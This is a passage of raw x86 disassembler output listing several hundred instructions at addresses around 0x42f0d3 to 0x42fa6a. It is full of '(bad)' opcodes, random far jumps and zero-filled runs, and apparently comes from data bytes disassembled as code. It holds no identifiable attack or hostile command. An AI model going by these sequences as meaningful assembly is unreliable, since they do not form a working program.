  42f0d3:	add    BYTE PTR [eax],al
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	mov    al,ds:0x676dcdf8
  42f0e7:	clc    
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	in     eax,0x8b
  42f0f0:	sbb    al,0xaa
  42f0f2:	mov    edi,0x4a7116ea
  42f0f7:	retf   0xa970
  42f0fa:	imul   eax,DWORD PTR [esi],0x55
  42f0fd:	or     dh,BYTE PTR cs:[edx-0xd775123]
  42f104:	inc    esp
  42f105:	mov    edi,0x7e284416
  42f10a:	cmp    edx,DWORD PTR [eax]
  42f10c:	bound  ebx,QWORD PTR [ebp+0x7187ddfb]
  42f112:	pusha  
  42f113:	and    al,0xf5
  42f115:	pop    ebx
  42f116:	pop    eax
  42f117:	add    dh,0xf1
  42f11a:	loope  0x42f0a4
  42f11c:	inc    ecx
  42f11d:	cmc    
  42f11e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f11f:	fisubr DWORD PTR [edi-0x7b7eadc]
  42f125:	test   DWORD PTR [ebx+0x79c143c2],esi
  42f12b:	gs and eax,0xb8d0778d
  42f131:	call   FWORD PTR [edx+0x70]
  42f134:	pop    esp
  42f135:	push   ebp
  42f136:	fdiv   QWORD PTR [ebp-0x52]
  42f139:	je     0x42f11b
  42f13b:	shl    al,1
  42f13d:	inc    edi
  42f13e:	adc    ah,dh
  42f140:	mov    cl,0x8e
  42f142:	jne    0x42f0d6
  42f144:	test   DWORD PTR [eax+eax*2-0x4a],0x16584053
  42f14c:	popa   
  42f14d:	xchg   edi,eax
  42f14e:	mov    WORD PTR [ebp+0x4686a9b9],sp
  42f155:	fidivr WORD PTR [ebp-0x3f]
  42f158:	add    esi,edi
  42f15a:	or     eax,esp
  42f15c:	or     cl,dh
  42f15e:	mov    al,0x48
  42f160:	nop
  42f161:	ins    BYTE PTR es:[edi],dx
  42f162:	xor    eax,DWORD PTR [ecx+edi*2-0x2dae0cf8]
  42f169:	fsubrp st(1),st
  42f16b:	xchg   BYTE PTR [ebx-0xa],bh
  42f16e:	fcomp  DWORD PTR [edx-0x1e]
  42f171:	adc    BYTE PTR [eax],0xe0
  42f174:	push   ebp
  42f175:	dec    esi
  42f176:	test   DWORD PTR [ecx+ebx*1+0x60],0x804637ad
  42f17e:	push   0x6
  42f180:	mov    ebp,DWORD PTR [eax]
  42f182:	daa    
  42f183:	imul   DWORD PTR [esi-0x7171f988]
  42f189:	adc    ebx,DWORD PTR [edx]
  42f18b:	outs   dx,DWORD PTR ds:[esi]
  42f18c:	mov    ebx,0xafcb3860
  42f191:	sbb    al,0x37
  42f193:	jae    0x42f1f3
  42f195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f196:	mul    DWORD PTR [ebp+0xc]
  42f199:	inc    eax
  42f19a:	inc    esp
  42f19b:	jbe    0x42f15d
  42f19d:	(bad)  
  42f19e:	imul   edx,DWORD PTR [edx],0x1f
  42f1a1:	(bad)  
  42f1a2:	bnd jg 0x42f1c1
  42f1a5:	loopne 0x42f182
  42f1a7:	push   edi
  42f1a8:	xchg   esi,eax
  42f1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1aa:	(bad)  
  42f1ab:	sub    BYTE PTR [ecx-0x3db1b299],al
  42f1b1:	xchg   edi,eax
  42f1b2:	dec    ecx
  42f1b3:	ror    DWORD PTR [ecx-0x6f],cl
  42f1b6:	jg     0x42f183
  42f1b8:	push   esp
  42f1b9:	leave  
  42f1ba:	mov    al,ds:0x4c9c32a3
  42f1bf:	test   DWORD PTR [edi+0x4e],edx
  42f1c2:	inc    ebp
  42f1c3:	sbb    al,0x67
  42f1c5:	cmp    DWORD PTR [esp+eax*2],edx
  42f1c8:	jle    0x42f232
  42f1ca:	add    eax,0x271a9fcc
  42f1cf:	push   0xffffffd8
  42f1d1:	add    DWORD PTR [ecx],eax
  42f1d3:	jae    0x42f1ea
  42f1d5:	fldenv [edx-0x5b]
  42f1d8:	inc    eax
  42f1d9:	mov    WORD PTR [edi],fs
  42f1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1dc:	mov    edx,0x18369a83
  42f1e1:	lds    eax,FWORD PTR [edx+0x13576065]
  42f1e7:	or     DWORD PTR [edi],esp
  42f1e9:	enter  0x992a,0xdb
  42f1ed:	dec    esp
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	inc    edx
  42f263:	mov    DWORD PTR [ebp+0x1f96725],esp
  42f269:	add    BYTE PTR [eax],al
  42f26b:	add    DWORD PTR [eax],eax
  42f26d:	add    BYTE PTR [ecx],dl
  42f26f:	push   edx
  42f270:	and    eax,0x77862efc
  42f275:	pop    es
  42f276:	stos   DWORD PTR es:[edi],eax
  42f277:	jno    0x42f240
  42f279:	jecxz  0x42f25a
  42f27b:	mov    cl,0xd9
  42f27d:	inc    edx
  42f27e:	pop    esp
  42f27f:	mov    ecx,0x8a976c
  42f284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f285:	lods   eax,DWORD PTR ds:[esi]
  42f286:	xor    eax,0x6d975786
  42f28b:	(bad)  
  42f28c:	into   
  42f28d:	jmp    0x3a50d8e7
  42f292:	ja     0xf6ab1c2a
  42f298:	sar    DWORD PTR [edx-0x3be2be71],0x25
  42f29f:	rol    BYTE PTR [si],1
  42f2a2:	(bad)  
  42f2a3:	xor    al,0x34
  42f2a5:	fs enter 0x2502,0xe4
  42f2aa:	nop
  42f2ab:	nop
  42f2ac:	dec    esp
  42f2ad:	lahf   
  42f2ae:	cmp    esi,DWORD PTR [ecx+0x7fc08a28]
  42f2b4:	cld    
  42f2b5:	jne    0x42f26a
  42f2b7:	stc    
  42f2b8:	xchg   ebp,eax
  42f2b9:	(bad)  
  42f2ba:	out    0xfb,al
  42f2bc:	jns    0x42f246
  42f2be:	dec    edx
  42f2bf:	add    al,0x2d
  42f2c1:	outs   dx,BYTE PTR ds:[esi]
  42f2c2:	push   ebp
  42f2c3:	xchg   ecx,eax
  42f2c4:	imul   ebp,DWORD PTR [edx-0x2f523bab],0xf84b70a4
  42f2ce:	mov    al,0xae
  42f2d0:	(bad)  
  42f2d1:	fisttp WORD PTR [esi+0xb]
  42f2d4:	and    ah,dh
  42f2d6:	retf   0xa435
  42f2d9:	dec    edi
  42f2da:	and    eax,0x474cf479
  42f2df:	mov    ebx,ds
  42f2e1:	fnstenv [edi-0x48]
  42f2e4:	std    
  42f2e5:	into   
  42f2e6:	or     eax,DWORD PTR [ebp+0x7f]
  42f2e9:	mul    ch
  42f2eb:	(bad)
  42f2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2f0:	inc    ebp
  42f2f1:	fcmovu st,st(2)
  42f2f3:	je     0x42f2c2
  42f2f5:	add    DWORD PTR [ebp-0x4bf8143d],ecx
  42f2fb:	sbb    eax,0xd1cd7297
  42f300:	gs in  eax,0x3c
  42f303:	out    dx,eax
  42f304:	cli    
  42f305:	sbb    esp,DWORD PTR [ebx-0x57c3e0b8]
  42f30b:	int    0x62
  42f30d:	inc    ecx
  42f30e:	jbe    0x42f2dc
  42f310:	sbb    esp,DWORD PTR [edi+0x4f19176b]
  42f316:	or     dh,al
  42f318:	sub    al,0x48
  42f31a:	adc    eax,0xc1104752
  42f31f:	push   edi
  42f320:	pop    ecx
  42f321:	mov    ds:0xb65b75a6,eax
  42f326:	mov    ds:0xd7db244d,eax
  42f32b:	sbb    BYTE PTR [esi],0x5e
  42f32e:	cmp    edx,DWORD PTR ds:0x1ab07de0
  42f334:	mov    cl,0x46
  42f336:	mov    ch,0xa7
  42f338:	icebp  
  42f339:	push   edx
  42f33a:	shr    BYTE PTR [eax],0x1e
  42f33d:	and    al,0xba
  42f33f:	(bad)  
  42f340:	(bad)  
  42f342:	jp     0x42f331
  42f344:	dec    ecx
  42f345:	lock fwait
  42f347:	leave  
  42f348:	repz xor BYTE PTR ds:0xb143a945,ah
  42f34f:	jno    0x42f326
  42f351:	shl    DWORD PTR [eax],0x1b
  42f354:	pop    edi
  42f355:	mov    eax,0xeaff59ad
  42f35a:	or     dh,BYTE PTR [ebp+0x4b]
  42f35d:	cmp    DWORD PTR [ebx-0x5d],eax
  42f360:	loopne 0x42f3c5
  42f362:	jno    0x42f375
  42f364:	loopne 0x42f32a
  42f366:	popa   
  42f367:	mov    eax,0x883cdc8e
  42f36c:	add    DWORD PTR [eax+0x0],eax
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	dec    esi
  42f3e3:	lods   al,BYTE PTR ds:[esi]
  42f3e4:	cwde   
  42f3e5:	adc    DWORD PTR [edi-0x6],esp
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	dec    ebx
  42f3ef:	adc    eax,0xd908335d
  42f3f4:	xchg   esp,eax
  42f3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3f6:	cdq    
  42f3f7:	test   eax,0x58aed111
  42f3fc:	aad    0x6a
  42f3fe:	push   esp
  42f3ff:	xor    bl,BYTE PTR [esi-0x39]
  42f402:	sahf   
  42f403:	and    al,0x5
  42f405:	lods   eax,DWORD PTR ds:[esi]
  42f406:	fnsave [esi]
  42f408:	ret    0x447f
  42f40b:	dec    edx
  42f40c:	out    0xf7,al
  42f40e:	xchg   ebp,eax
  42f40f:	dec    esp
  42f410:	push   ebx
  42f411:	int3   
  42f412:	in     al,dx
  42f413:	sbb    dh,BYTE PTR [ebx-0x31f08567]
  42f419:	rcr    bl,0xa
  42f41c:	pop    ebx
  42f41d:	adc    BYTE PTR [ecx-0x49],ch
  42f420:	pop    eax
  42f421:	xchg   ebp,eax
  42f422:	mov    esi,0xd83ac24d
  42f427:	pop    ebp
  42f428:	fcom   DWORD PTR [ebp+0x54]
  42f42b:	call   0xfb03838e
  42f430:	aam    0xdc
  42f432:	xchg   BYTE PTR [edx+ebx*4+0x5a12a571],al
  42f439:	pop    esp
  42f43a:	test   al,0xa
  42f43c:	pop    ecx
  42f43d:	icebp  
  42f43e:	mov    bh,0x6
  42f440:	mov    ebp,0x2a71c24a
  42f445:	jecxz  0x42f3d9
  42f447:	inc    ecx
  42f448:	scas   al,BYTE PTR es:[edi]
  42f449:	jne    0x42f432
  42f44b:	jge    0x42f3eb
  42f44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f44e:	sti    
  42f44f:	ins    BYTE PTR es:[edi],dx
  42f450:	ds dec esi
  42f452:	mul    BYTE PTR [esp+esi*8-0x7d]
  42f456:	jnp    0x42f445
  42f458:	std    
  42f459:	pop    ebp
  42f45a:	repz pop es
  42f45c:	or     cl,BYTE PTR [edi+0xf89a63e]
  42f462:	lahf   
  42f463:	call   DWORD PTR [ecx+edx*8-0x42]
  42f467:	pop    esi
  42f468:	cmp    ah,bh
  42f46a:	mov    cl,0x9b
  42f46c:	loope  0x42f415
  42f46e:	js     0x42f44d
  42f470:	jg     0x42f40f
  42f472:	adc    ecx,DWORD PTR [ecx+esi*1]
  42f475:	add    esp,DWORD PTR [ecx-0x3c817234]
  42f47b:	ret    0xb67a
  42f47e:	jmp    0x42f446
  42f480:	or     BYTE PTR [eax+0x2ddd4b5c],dh
  42f486:	fcomp  DWORD PTR [eax+esi*2]
  42f489:	mov    cl,0xca
  42f48b:	pop    ecx
  42f48c:	js     0x42f4e2
  42f48e:	aaa    
  42f48f:	or     ah,bh
  42f491:	push   es
  42f492:	int3   
  42f493:	hlt    
  42f494:	into   
  42f495:	out    0x60,eax
  42f497:	xchg   edi,eax
  42f498:	pop    esi
  42f499:	add    bl,BYTE PTR [ecx]
  42f49b:	mov    eax,ds:0x2c0a3b2e
  42f4a0:	inc    ebp
  42f4a1:	pop    ebx
  42f4a2:	not    BYTE PTR [esi-0x1a]
  42f4a5:	ror    cl,cl
  42f4a7:	fstp   DWORD PTR [eax]
  42f4a9:	inc    ecx
  42f4aa:	and    eax,0x74b8be26
  42f4af:	bound  edx,QWORD PTR ds:0x471cd56d
  42f4b5:	loope  0x42f51d
  42f4b7:	lods   eax,DWORD PTR ds:[esi]
  42f4b8:	cld    
  42f4b9:	and    al,BYTE PTR [ecx-0x38]
  42f4bc:	ja     0x42f4d7
  42f4be:	imul   edi
  42f4c0:	js     0x42f44e
  42f4c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f4c3:	rol    bl,1
  42f4c5:	fist   WORD PTR [edx-0x68bb978f]
  42f4cb:	dec    eax
  42f4cc:	out    0xec,al
  42f4ce:	call   0xf83fb3e0
  42f4d3:	push   0x25b963e7
  42f4d8:	mov    al,ds:0xc96290b1
  42f4dd:	cmp    BYTE PTR [esi],dh
  42f4df:	mov    edi,0x4e5c80f5
  42f4e4:	not    DWORD PTR es:[edi-0x17]
  42f4e8:	das    
  42f4e9:	std    
  42f4ea:	(bad)  [esi+0x56]
  42f4ed:	and    eax,0x0
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	and    BYTE PTR ss:[esi+0x30],cl
  42f566:	addr16 sti 
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	out    dx,al
  42f56f:	mov    bh,0x17
  42f571:	aam    0x89
  42f573:	xchg   ecx,eax
  42f574:	pop    edi
  42f575:	xchg   esi,eax
  42f576:	xor    BYTE PTR [eax+0x59],0x6
  42f57a:	or     BYTE PTR [edi+eax*1+0x7ba6a0a3],bl
  42f581:	inc    eax
  42f582:	(bad)  
  42f583:	rcl    BYTE PTR [ebx-0x675fa93],1
  42f589:	fmul   QWORD PTR [ebp+ebx*8+0x5a122a09]
  42f590:	sbb    esp,ecx
  42f592:	push   es
  42f593:	mov    ebx,0xebfaec4
  42f598:	sub    al,0xd2
  42f59a:	jo     0x42f53b
  42f59c:	hlt    
  42f59d:	pop    ebp
  42f59e:	mov    DWORD PTR [ebp+edi*8-0x4a],esp
  42f5a2:	pop    esi
  42f5a3:	clc    
  42f5a4:	dec    esp
  42f5a5:	aas    
  42f5a6:	add    DWORD PTR [ebp+eiz*2-0x1],edx
  42f5aa:	xor    ebp,DWORD PTR [esi]
  42f5ac:	mov    esi,ebx
  42f5ae:	ror    BYTE PTR [ebx+0x6e91d9cb],0x69
  42f5b5:	fcmovnb st,st(6)
  42f5b7:	xchg   edx,eax
  42f5b8:	aaa    
  42f5b9:	jb     0x42f586
  42f5bb:	mov    esp,0xabaa865a
  42f5c0:	enter  0xec09,0xf4
  42f5c4:	jl     0x42f612
  42f5c6:	stos   DWORD PTR es:[edi],eax
  42f5c7:	(bad)  
  42f5c8:	stc    
  42f5c9:	fistp  DWORD PTR [esi+0x3f2cfbb3]
  42f5cf:	cmp    eax,0xea0d7334
  42f5d4:	jae    0x42f647
  42f5d6:	dec    esi
  42f5d7:	out    0x2c,eax
  42f5d9:	out    0x6,al
  42f5db:	xchg   ebp,eax
  42f5dc:	iret   
  42f5dd:	xlat   BYTE PTR ds:[ebx]
  42f5de:	test   eax,0xb2740519
  42f5e3:	or     BYTE PTR [edi+0x3f],bh
  42f5e6:	mov    ?,esp
  42f5e8:	push   ebx
  42f5e9:	adc    edx,DWORD PTR [ecx]
  42f5eb:	sbb    bl,BYTE PTR [ebx-0x36]
  42f5ee:	in     al,0x3
  42f5f0:	jae    0x42f664
  42f5f2:	retf   0x495d
  42f5f5:	xor    eax,0xbcccfbd1
  42f5fa:	sub    eax,0xbcddcb13
  42f5ff:	jecxz  0x42f615
  42f601:	lock out dx,al
  42f603:	test   eax,0xf4515257
  42f608:	mov    dh,0xef
  42f60a:	jle    0x42f68b
  42f60c:	aad    0x57
  42f60e:	jl     0x42f602
  42f610:	les    ecx,FWORD PTR [eax]
  42f612:	xchg   ebx,eax
  42f613:	fmul   QWORD PTR [eax-0x7480bc3e]
  42f619:	mov    eax,ds:0x48a8aa83
  42f61e:	push   ebp
  42f61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f620:	lods   al,BYTE PTR ds:[esi]
  42f621:	mov    ds:0x5cf149d5,al
  42f626:	push   0x62
  42f628:	sti    
  42f629:	fwait
  42f62a:	sbb    eax,0xfd275a4b
  42f62f:	and    BYTE PTR [edi],bl
  42f631:	sar    cl,0x16
  42f634:	mov    edx,0x440fa77d
  42f639:	add    DWORD PTR [ecx+0x1db100ae],ebp
  42f63f:	cdq    
  42f640:	in     al,0x2c
  42f642:	loop   0x42f677
  42f644:	mov    al,ds:0x2eaa4a4c
  42f649:	pushf  
  42f64a:	xchg   DWORD PTR [ebx-0x6ee751bb],ecx
  42f650:	mov    ds:0xf588fd4e,al
  42f655:	int3   
  42f656:	pop    esp
  42f657:	mov    ecx,0xf1e93541
  42f65c:	inc    ebx
  42f65d:	out    dx,al
  42f65e:	jo     0x42f66a
  42f660:	sub    DWORD PTR [ecx*1+0xfeddd8d],esi
  42f667:	xlat   BYTE PTR ds:[ebx]
  42f668:	pop    ebx
  42f669:	lea    edx,[edi]
  42f66b:	jmp    0x42f6e6
  42f66d:	adc    al,BYTE PTR [eax]
	...
  42f6d3:	add    BYTE PTR [eax],al
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	ins    DWORD PTR es:[edi],dx
  42f6e3:	mov    DWORD PTR [ecx],esi
  42f6e5:	inc    esp
  42f6e6:	addr16 cld 
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	maxps  xmm3,XMMWORD PTR [esi-0x537c660a]
  42f6f5:	adc    al,0x61
  42f6f7:	bound  edx,QWORD PTR [ecx+0x22]
  42f6fa:	push   cs
  42f6fb:	pop    esi
  42f6fc:	not    DWORD PTR [eax+0x5ac59a09]
  42f702:	aaa    
  42f703:	mov    DWORD PTR [ebp+0x60aa0171],ebx
  42f709:	and    esi,esp
  42f70b:	and    ebp,DWORD PTR [edx-0x6eb61264]
  42f711:	mov    bh,0x35
  42f713:	push   ss
  42f714:	in     al,dx
  42f715:	mov    edx,?
  42f717:	push   cs
  42f718:	mov    edx,0xaa1bcf65
  42f71d:	add    esi,ebp
  42f71f:	setns  dh
  42f722:	dec    edx
  42f723:	outs   dx,BYTE PTR ds:[esi]
  42f724:	ret    
  42f725:	xchg   ch,bh
  42f727:	mov    cl,0x1a
  42f729:	out    0xd6,eax
  42f72b:	dec    eax
  42f72c:	sbb    bh,BYTE PTR [esi-0x1d]
  42f72f:	sub    eax,DWORD PTR [ebp-0x56e439da]
  42f735:	sar    DWORD PTR [ecx],0x6c
  42f738:	das    
  42f739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f73a:	push   eax
  42f73b:	xchg   ebp,eax
  42f73c:	sub    edx,ecx
  42f73e:	mov    BYTE PTR [edi],dl
  42f740:	pop    es
  42f741:	push   0xa
  42f743:	xor    al,BYTE PTR [ecx-0x10]
  42f746:	mov    dh,0xb
  42f748:	(bad)  
  42f749:	pop    edx
  42f74a:	xchg   ebx,eax
  42f74b:	pop    edi
  42f74c:	icebp  
  42f74d:	sbb    DWORD PTR [esi+0x27],edi
  42f750:	and    ebp,DWORD PTR [edx+0x705fbf3b]
  42f756:	mov    dh,0x8b
  42f758:	cwde   
  42f759:	adc    BYTE PTR [edx-0x55351e52],0xd9
  42f760:	xchg   ebp,eax
  42f761:	add    DWORD PTR [eax-0x64],edx
  42f764:	in     eax,dx
  42f765:	push   es
  42f766:	push   ebx
  42f767:	mov    dl,0x48
  42f769:	jmp    FWORD PTR [esp+eiz*2+0x333762d4]
  42f770:	and    esp,DWORD PTR [edi]
  42f772:	mov    al,0xfa
  42f774:	xchg   ecx,eax
  42f775:	data16 jno 0x42f763
  42f778:	retf   0xb503
  42f77b:	aam    0xfd
  42f77d:	loopne 0x42f760
  42f77f:	mov    eax,0xe20de81c
  42f784:	loopne 0x42f7b0
  42f786:	scas   eax,DWORD PTR es:[edi]
  42f787:	mov    al,ds:0x7745ad0d
  42f78c:	in     al,dx
  42f78d:	add    DWORD PTR [ecx],eax
  42f78f:	mov    ds:0x2289f8f3,eax
  42f794:	pop    edi
  42f795:	pop    edi
  42f796:	(bad)  
  42f797:	aam    0xd2
  42f799:	inc    esp
  42f79a:	xor    al,0x55
  42f79c:	imul   ecx,esp,0x29
  42f79f:	or     eax,0x4eed9f83
  42f7a4:	xor    DWORD PTR ds:0x43057eaa,ebx
  42f7aa:	push   ecx
  42f7ab:	jmp    0x8a81:0x5084beea
  42f7b2:	sub    dl,BYTE PTR [edi]
  42f7b4:	cli    
  42f7b5:	mov    ecx,0x8300a771
  42f7ba:	fcmovnbe st,st(0)
  42f7bc:	mov    ah,0x38
  42f7be:	jno    0x42f781
  42f7c0:	fisub  DWORD PTR [ecx+eax*4-0x6c]
  42f7c4:	pop    ebp
  42f7c5:	call   0x3a83f8a
  42f7ca:	pop    ds
  42f7cb:	enter  0x8c5d,0xf5
  42f7cf:	int    0xaa
  42f7d1:	fs inc ecx
  42f7d3:	push   cs
  42f7d4:	jl     0x42f80f
  42f7d6:	pop    ss
  42f7d7:	xor    ah,BYTE PTR [ebp-0x4f8b7f05]
  42f7dd:	sub    al,0x16
  42f7df:	fsub   DWORD PTR [eax+esi*1-0x2e]
  42f7e3:	and    eax,0x2bbb79d
  42f7e8:	int3   
  42f7e9:	je     0x42f7ba
  42f7eb:	xchg   edi,eax
  42f7ec:	sar    BYTE PTR [esi],1
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xd21155ad
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	sbb    dl,BYTE PTR [edx+0x2e1ddd0c]
  42f874:	shr    DWORD PTR [edi+0x5a],cl
  42f877:	push   ss
  42f878:	jmp    FWORD PTR [eax+0x20]
  42f87b:	push   ecx
  42f87c:	retf   0x34aa
  42f87f:	sbb    eax,ebp
  42f881:	ret    
  42f882:	sbb    BYTE PTR [ecx],ch
  42f884:	sbb    edi,DWORD PTR [eax]
  42f886:	add    ah,BYTE PTR [ecx+esi*8]
  42f889:	rcr    esi,1
  42f88b:	pusha  
  42f88c:	or     dl,bh
  42f88e:	mov    al,BYTE PTR [esi-0x6c]
  42f891:	mov    eax,ds:0x716b6c7f
  42f896:	mov    ebp,0xfa285732
  42f89b:	in     eax,0x57
  42f89d:	cmp    edi,DWORD PTR [edx]
  42f89f:	mov    eax,0x2d413bdd
  42f8a4:	and    eax,0x20f09aca
  42f8a9:	retf   0xc0ef
  42f8ac:	shl    BYTE PTR [edi],1
  42f8ae:	cmp    eax,0xbc458c70
  42f8b3:	fmul   st,st(0)
  42f8b5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42f8b7:	jmp    0x4c11:0x53a23a25
  42f8be:	jg     0x42f8af
  42f8c0:	les    esi,FWORD PTR [edi+0x5c]
  42f8c3:	leave  
  42f8c4:	icebp  
  42f8c5:	cmp    dl,BYTE PTR [ecx-0x227777b7]
  42f8cb:	gs pushf 
  42f8cd:	mov    dh,BYTE PTR [edi-0x2c]
  42f8d0:	mov    al,0x22
  42f8d2:	lods   al,BYTE PTR gs:[esi]
  42f8d4:	dec    ebp
  42f8d5:	sub    edi,ecx
  42f8d7:	xchg   ebp,eax
  42f8d8:	xchg   sp,ax
  42f8da:	pop    ebp
  42f8db:	cs lahf 
  42f8dd:	ret    
  42f8de:	je     0x42f956
  42f8e0:	mov    bh,0x7d
  42f8e2:	jle    0x42f90f
  42f8e4:	sub    BYTE PTR [ebp+0x3b],dl
  42f8e7:	push   0x46
  42f8e9:	fstp   st(6)
  42f8eb:	mov    cl,0x9f
  42f8ed:	push   edi
  42f8ee:	cs loope 0x42f95c
  42f8f1:	fsub   QWORD PTR [esp+ebx*2]
  42f8f4:	lds    ebp,FWORD PTR [eax]
  42f8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8f7:	shl    DWORD PTR [eax+edx*8-0x5f4b8f5e],0xe4
  42f8ff:	jmp    0x42f90c
  42f901:	out    dx,al
  42f902:	fldenv ds:0xb5541af9
  42f908:	cdq    
  42f909:	mov    ch,0xc
  42f90b:	repz fstp TBYTE PTR [esi]
  42f90e:	test   al,0x4
  42f910:	push   ss
  42f911:	fdivr  QWORD PTR [ebx]
  42f913:	jle    0x42f8f1
  42f915:	jo     0x42f98a
  42f917:	sbb    eax,0xb4c6a2dc
  42f91c:	es push edi
  42f91e:	mov    esi,0x8d4004f6
  42f923:	ret    0xc060
  42f926:	cmp    BYTE PTR [ebx-0x49],bl
  42f929:	jno    0x42f8af
  42f92b:	daa    
  42f92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f92d:	in     al,0x2a
  42f92f:	sbb    BYTE PTR [ebx-0x2437ed0],cl
  42f935:	xor    ebx,DWORD PTR [esi+eiz*8-0x5f64d662]
  42f93c:	mov    DWORD PTR [eax],ebp
  42f93e:	sar    BYTE PTR [eax],0xa0
  42f941:	sbb    al,0xb7
  42f943:	push   edx
  42f944:	jo     0x42f941
  42f946:	jl     0x42f914
  42f948:	lds    ebx,FWORD PTR [ebp-0x4f]
  42f94b:	mov    ch,0x20
  42f94d:	stos   BYTE PTR es:[edi],al
  42f94e:	retf   
  42f94f:	fisttp DWORD PTR [edi]
  42f951:	ret    
  42f952:	sub    BYTE PTR [esi],bl
  42f954:	fisub  WORD PTR [edx+0x4b]
  42f957:	hlt    
  42f958:	mov    edi,0x219c4cdd
  42f95d:	sub    al,0x3f
  42f95f:	sub    DWORD PTR [eax],ebp
  42f961:	arpl   WORD PTR [ecx*4+0x38b0af6a],di
  42f968:	outs   dx,DWORD PTR ds:[esi]
  42f969:	and    ah,dl
  42f96b:	push   edi
  42f96c:	in     al,dx
  42f96d:	test   BYTE PTR [eax],0x0
	...
  42f9d4:	add    BYTE PTR [eax],al
  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f9d7
  42f9e3:	stos   BYTE PTR es:[edi],al
  42f9e4:	pop    esp
  42f9e5:	inc    ebx
  42f9e6:	inc    BYTE PTR [bx+di]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [edx-0x7b],dh
  42f9f0:	in     al,0xd4
  42f9f2:	cli    
  42f9f3:	push   0xffffff84
  42f9f5:	mov    edx,0x2ab005d2
  42f9fa:	sub    DWORD PTR [edi],ebx
  42f9fc:	push   0xffffff9e
  42f9fe:	sbb    ah,BYTE PTR [edx-0x42]
  42fa01:	pop    ebp
  42fa02:	test   BYTE PTR [si+0x6d7e],bh
  42fa07:	xchg   edi,eax
  42fa08:	and    eax,0xbadb0d44
  42fa0d:	sbb    BYTE PTR [eax-0x2ef2f933],bh
  42fa13:	inc    esi
  42fa14:	adc    al,0xf
  42fa16:	in     eax,0x36
  42fa18:	data16 sbb BYTE PTR [edx+0x75],cl
  42fa1c:	mov    esi,0xb85d8fc2
  42fa21:	clc    
  42fa22:	sbb    DWORD PTR [edi],ebp
  42fa24:	mov    cl,0x33
  42fa26:	jge    0x42f9ea
  42fa28:	xlat   BYTE PTR ds:[ebx]
  42fa29:	loop   0x42f9fb
  42fa2b:	pop    ebp
  42fa2c:	jmp    0x77a:0x1a2c255a
  42fa33:	cli    
  42fa34:	mov    bl,0xf9
  42fa36:	stos   BYTE PTR es:[edi],al
  42fa37:	xchg   DWORD PTR [eax-0x4ad37e20],edx
  42fa3d:	rol    DWORD PTR [ebp+ebp*2+0x40],cl
  42fa41:	mov    eax,0x7b14d91a
  42fa46:	xchg   edx,eax
  42fa47:	jae    0x42fa25
  42fa49:	push   edi
  42fa4a:	int3   
  42fa4b:	pop    ss
  42fa4c:	adc    BYTE PTR [esi],dl
  42fa4e:	sbb    eax,0x20552ef8
  42fa53:	mov    ds:0x8862fd7b,al
  42fa58:	(bad)  
  42fa59:	xor    eax,0xbb586424
  42fa5e:	inc    ecx
  42fa5f:	jp     0x42fa1b
  42fa61:	adc    esp,DWORD PTR [ebx+0x2e]
  42fa64:	mov    ch,0x2f
  42fa66:	and    al,0xf5
  42fa68:	(bad)  
  42fa6a:	and    ebp,DWORD PTR [eax+ecx*8]
